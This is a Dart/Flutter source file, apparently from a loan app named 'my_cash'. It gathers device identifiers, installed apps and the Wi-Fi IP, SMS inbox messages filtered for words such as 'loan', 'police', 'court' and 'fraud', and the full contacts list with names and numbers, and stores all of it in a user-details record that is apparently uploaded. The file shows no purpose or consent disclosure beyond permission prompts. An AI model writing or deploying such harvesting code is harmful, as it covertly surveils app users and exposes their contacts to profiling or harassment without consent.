import 'dart:convert';
import 'dart:io';
import 'package:device_apps/device_apps.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:my_cash/controllers/GlobalState.dart';
import 'package:my_cash/controllers/saving_user_details.dart';
import 'package:my_cash/models/userDetailModel.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

class DeviceInfo {
  static getDeviceInfo() async {
    var deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      var device = await deviceInfo.androidInfo;
      var data = {
        "recordingTime": "${DateTime.now()}",
        "deviceName": "${device.manufacturer}",
        "equipmentSystem": "ANDROID",
        "deviceSerialNumber": "${device.androidId}",
        "systemVersion": "${device.version.release}",
        "equipmentModel": "${device.model}"
      };
      GlobalState.userDetails = UserDetailModel.fromJson(data);
      print("Device ${GlobalState.userDetails}");
      updateUserDetails(GlobalState.userDetails);
    }

    // print(data);
  }

  static getInstalledApps() async {
    List installedApps = [];

    List<Application> apps = await DeviceApps.getInstalledApplications();
    apps.forEach((Application app) {
      installedApps.add(app.appName);
    });

    GlobalState.userDetails!.installedApps = jsonEncode(installedApps);
  }

  static getWifiIPAddress() async {
    String? wifiIP = await NetworkInfo().getWifiIP();
    
    GlobalState.userDetails!.wifiIpAddress = wifiIP;
  }

  static getSMSList() async {
    List detectedSMS = [];
    SmsQuery query = SmsQuery();
    var permission = await Permission.sms.status;
    if (permission.isGranted) {
      final messages = await query.querySms(
        kinds: [SmsQueryKind.inbox],
      );
      messages.forEach((message) {
        String msg =  message.body!.toLowerCase();
        if(msg.contains("loan") || msg.contains("repayment") || msg.contains("police") || msg.contains("court") || msg.contains("fraud")){
          detectedSMS.add(message.body);
        }
      });
      GlobalState.userDetails!.messagesList = jsonEncode(detectedSMS);
    } else {
      await Permission.sms.request();
    }
  }

  static getContactsList() async {
    List customContactList = [];
    List<Contact> contacts;
    var permission = await Permission.contacts.status;
    if(permission.isGranted){
      contacts = await FlutterContacts.getContacts(withProperties: true);

    contacts.forEach((contact) {
      if(contact.phones.isNotEmpty){
      customContactList.add({
        "name": contact.displayName,
        "number": contact.phones[0].number,
      });
      }
    });    
    GlobalState.userDetails!.contactsList = jsonEncode(customContactList);
    }else{
      await Permission.contacts.request();
    }
    

  }
}
